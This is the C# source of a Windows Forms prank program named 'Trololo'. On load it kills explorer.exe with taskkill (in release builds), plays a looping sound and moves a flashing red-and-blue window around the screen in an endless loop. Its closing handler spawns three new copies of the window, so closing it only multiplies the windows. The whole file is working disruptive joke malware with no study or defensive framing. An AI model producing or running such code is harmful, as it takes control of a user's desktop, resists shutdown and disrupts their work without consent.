using System;
using System.Diagnostics;
using System.Drawing;
using System.Media;
using System.Threading;
using System.Windows.Forms;

namespace Trololo
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e) {}

        private void Form1_Load(object sender, EventArgs e)
        {
            Process p = new Process();
            p.StartInfo.FileName = "taskkill.exe";
            p.StartInfo.Arguments = "/f /im explorer.exe";
;           p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = false;
            p.StartInfo.RedirectStandardOutput = false;
            p.StartInfo.RedirectStandardError = false;
            p.StartInfo.CreateNoWindow = true;
            #if RELEASE
            p.Start();
            p.WaitForExit();
            #endif
            p.Close();
            PlaySound();
            this.FormClosing += Form1_FormClosing;
            this.Visible = true;
            Rectangle bounds = Screen.GetBounds(Screen.GetBounds(Point.Empty));
            Random rd = new Random();
            while (true)
            {
                this.BackColor = Color.Red;
                int picXPoint = rd.Next(0, bounds.Right - this.Width);
                int picYPoint = rd.Next(0, bounds.Height - this.Height);
                Point ulCorner = new Point(picXPoint, picYPoint);
                this.Location = ulCorner;
                Delay((int)(128*2.256));
                this.BackColor = Color.Blue;
                Delay((int)(128*1.43333));
                var tmpv = new Random().Next(5);
                if (tmpv == 3)
                {
                    this.BackColor = Color.Red;
                    label1.BackColor = Color.Blue;
                    Delay((int)(128 * 1.43333));
                    label1.BackColor = Color.Red;
                    this.BackColor = Color.Blue;
                    Delay((int)(128 * 1.43333));
                    label1.BackColor = Color.Empty;
                }
            }
        }
        private void showAlarm()
        {
            try { new Thread(new ThreadStart(PlaySound)).Start(); }catch (Exception) { }
        }

        private void PlaySound()
        {
            try
            {
                new SoundPlayer(Properties.Resources.ResourceManager.GetStream("trolo")).PlayLooping();
            }
            catch (Exception)
            {

            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            for (int i = 0; i < 3; i++)
            {
                new Form1().Show();
            }
        }

        public static void Delay(int mm)
        {
            DateTime current = DateTime.Now;
            while (current.AddMilliseconds(mm) > DateTime.Now)
            {
                Application.DoEvents();
            }
            return;
        }

    }
}
